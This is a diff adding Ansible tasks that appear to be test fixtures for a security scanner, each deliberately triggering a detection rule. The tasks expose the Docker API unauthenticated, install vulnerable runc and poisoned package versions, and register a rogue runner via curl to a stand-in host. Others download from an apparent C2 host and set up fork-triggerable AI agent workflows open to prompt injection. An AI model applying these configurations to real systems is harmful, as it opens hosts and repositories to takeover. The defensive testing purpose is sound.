@@ -5574,3 +5574,114 @@
                   with:
                     path: node_modules
                     key: deps-${{ hashFiles('package-lock.json') }}
+
+    # --- operational_security.yml: docker_api_exposed_plaintext ---
+    - name: trigger docker_api_exposed_plaintext
+      ansible.builtin.copy:
+        dest: /etc/systemd/system/docker.service.d/override.conf
+        content: |
+          [Service]
+          ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
+
+    # --- system_compromise.yml: runc_procfs_write_breakout_vulnerable_install ---
+    - name: trigger runc_procfs_write_breakout_vulnerable_install
+      ansible.builtin.package:
+        name: runc
+        version: 1.2.5
+
+    # --- system_compromise.yml: af_alg_aead_interface_enabled_copy_fail ---
+    - name: trigger af_alg_aead_interface_enabled_copy_fail
+      community.general.modprobe:
+        name: algif_aead
+        state: present
+
+    # --- supply_chain.yml: rogue_self_hosted_runner_registration_persistence ---
+    - name: trigger rogue_self_hosted_runner_registration_persistence
+      ansible.builtin.shell: >-
+        ./config.sh --url https://github.com/acme/app
+        --token $(curl -s https://relay.invalid/t) --unattended --replace
+
+    # --- supply_chain.yml: gitlab_ci_include_from_untrusted_remote_or_mutable_ref ---
+    - name: trigger gitlab_ci_include_from_untrusted_remote_or_mutable_ref
+      ansible.builtin.copy:
+        dest: .gitlab-ci.yml
+        content: |
+          include:
+            - remote: 'https://ci.invalid/pipelines/deploy.yml'
+
+    # --- ai_ml_security.yml: fork_triggerable_ai_agent_with_write_or_exec_tools ---
+    - name: trigger fork_triggerable_ai_agent_with_write_or_exec_tools
+      ansible.builtin.copy:
+        dest: .github/workflows/claude-review.yml
+        content: |
+          jobs:
+            review:
+              steps:
+                - uses: anthropics/claude-code-action@v1
+                  with:
+                    allowed_non_write_users: "*"
+                    claude_args: |
+                      --allowedTools Edit,Read,Write,Grep,Glob,Bash
+
+    # --- ai_ml_security.yml: fork_triggerable_ai_agent_with_repo_mutating_gh_tools ---
+    - name: trigger fork_triggerable_ai_agent_with_repo_mutating_gh_tools
+      ansible.builtin.copy:
+        dest: .github/workflows/claude-issue-triage.yml
+        content: |
+          jobs:
+            triage:
+              steps:
+                - uses: anthropics/claude-code-action@v1
+                  with:
+                    allowed_non_write_users: "*"
+                    claude_args: |
+                      --allowedTools "Read,Glob,Grep,Bash(gh pr comment:*),Bash(gh issue edit:*)"
+
+    # --- ai_ml_security.yml: untrusted_event_content_interpolated_into_ai_agent_prompt ---
+    - name: trigger untrusted_event_content_interpolated_into_ai_agent_prompt
+      ansible.builtin.copy:
+        dest: .github/workflows/claude-triage.yml
+        content: |
+          jobs:
+            triage:
+              steps:
+                - uses: anthropics/claude-code-action@v1
+                  with:
+                    direct_prompt: "Triage this issue: ${{ github.event.issue.body }}"
+
+    # --- ai_ml_security.yml: fork_triggerable_gemini_or_copilot_agent_with_write_or_exec ---
+    - name: trigger fork_triggerable_gemini_or_copilot_agent_with_write_or_exec
+      ansible.builtin.copy:
+        dest: .github/workflows/gemini.yml
+        content: |
+          jobs:
+            gemini:
+              steps:
+                - uses: google-github-actions/run-gemini-cli@v1
+                  with:
+                    gemini_api_key: ${{ secrets.GEMINI_API_KEY }}
+                    settings: |
+                      { "tools": { "run_shell_command": true } }
+
+    # --- supply_chain.yml: mini_shai_hulud_poisoned_package_version_install ---
+    - name: trigger mini_shai_hulud_poisoned_package_version_install
+      ansible.builtin.pip:
+        name: mistralai==2.4.6
+
+    # --- system_compromise.yml: dirtyclone_vulnerable_skb_module_enabled ---
+    - name: trigger dirtyclone_vulnerable_skb_module_enabled
+      community.general.modprobe:
+        name: esp4
+        state: present
+
+    # --- supply_chain.yml: shai_hulud_c2_or_payload_endpoint_referenced ---
+    - name: trigger shai_hulud_c2_or_payload_endpoint_referenced
+      ansible.builtin.get_url:
+        url: https://git-tanstack.com/transformers.pyz
+        dest: /tmp/transformers.pyz
+
+    # --- supply_chain.yml: trivy_teampcp_backdoored_image_or_c2_referenced ---
+    - name: trigger trivy_teampcp_backdoored_image_or_c2_referenced
+      community.docker.docker_image:
+        name: aquasec/trivy:0.69.4
+        source: pull
